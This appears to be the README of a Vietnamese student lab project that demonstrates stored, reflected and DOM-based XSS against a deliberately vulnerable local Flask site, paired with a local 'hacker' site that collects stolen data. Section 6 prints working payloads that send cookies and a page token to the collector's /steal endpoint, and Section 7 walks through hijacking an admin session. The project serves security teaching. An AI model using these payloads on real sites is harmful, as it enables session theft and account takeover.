# Demo Do An Bao Mat: Stored XSS (2 Folder, 2 Localhost)

## 1) Mo ta
Project da duoc tach thanh 2 ung dung rieng:
- Victim site: trang admin/user binh thuong, chay o localhost:5000
- Hacker site: trang cua hacker de thu cookie, chay o localhost:5001

## 2) Cau truc thu muc

```text
final/
   victim_site/
      app.py
   config.py
   db.py
   security.py
   .env.example
      requirements.txt
      database.db
      cookies.txt
      templates/
      static/
   hacker_site/
      app.py
      requirements.txt
      hacker_cookies.txt
      templates/
         hacker_dashboard.html
   README.md
```

## 3) Cai dat

Ban co the cai 1 lan tu root hoac trong moi folder:

```bash
pip install -r victim_site/requirements.txt
```

hoac

```bash
cd victim_site
pip install -r requirements.txt
cd ..
cd hacker_site
pip install -r requirements.txt
```

## 3.1) Ket noi CSDL voi Railway (MySQL)

Project victim site da ho tro 2 che do CSDL:
- Co `DATABASE_URL` => dung Railway MySQL
- Khong co `DATABASE_URL` => fallback ve SQLite local

App da tach rieng cac file:
- `config.py`: load env va cac bien cau hinh
- `db.py`: ket noi DB + khoi tao schema
- `security.py`: decorator va input validation

Buoc cau hinh Railway:

1. Vao Railway, tao project moi.
2. Add service MySQL.
3. Mo tab Variables, copy bien `DATABASE_URL`.
4. Trong `victim_site`, tao file `.env` tu mau `.env.example` va dien gia tri:

```env
DATABASE_URL=mysql://user:password@host:port/database
SECRET_KEY=doi-secret-key-rieng-cua-ban
```

5. Chay victim app (app se tu dong doc file `.env`):

```powershell
cd victim_site
python app.py
```

Neu muon secure mode:

```powershell
cd victim_site
python app.py --secure
```

Khi chay thanh cong, terminal se in:
- `[DB] Dang su dung Railway MySQL qua DATABASE_URL`

## 4) Chay 2 localhost bang 2 terminal

### Terminal 1: Victim (admin/user)

```bash
cd victim_site
python app.py
```

Mo: http://127.0.0.1:5000

### Terminal 2: Hacker

```bash
cd hacker_site
python app.py
```

Mo: http://127.0.0.1:5001

### Chay victim o secure mode

```bash
cd victim_site
python app.py --secure
```

## 5) Tai khoan mau

- Admin
   - username: admin
   - password: admin123
- User: tu dang ky

## 6) Payload XSS de demo

Chen vao comment tren victim site:

```html
<script>
new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
</script>
```
http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E

http://127.0.0.1:5000/profile#%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Ftoken%3D%27%2Bdocument.getElementById%28%27demoToken%27%29.innerText%29%22%3E
## 7) Quy trinh demo

1. Mo hacker site tren localhost:5001.
2. Dang nhap user thuong tren victim site.
3. Chen payload vao comment.
4. Dang nhap admin o tab khac.
5. Admin mo trang /admin.
6. Payload chay tren trinh duyet admin va gui cookie sang hacker site.
7. Kiem tra log o hacker dashboard hoac file hacker_cookies.txt.
8. Dung cookie de mo phong session hijack.
9. Chay secure mode de doi chieu cach fix.

## 8) Route chinh

Victim site:
- GET /
- GET, POST /register
- GET, POST /login
- GET /logout
- GET, POST /user
- GET /admin
- POST /admin/delete/<id>
- GET /about-security
- GET /log?cookie=... (route doi chieu)

Hacker site:
- GET /
- GET /steal?cookie=...
- POST /clear

## 9) Luu y

- Chi dung de hoc tap trong moi truong lab noi bo.
- Khong trien khai ra internet.
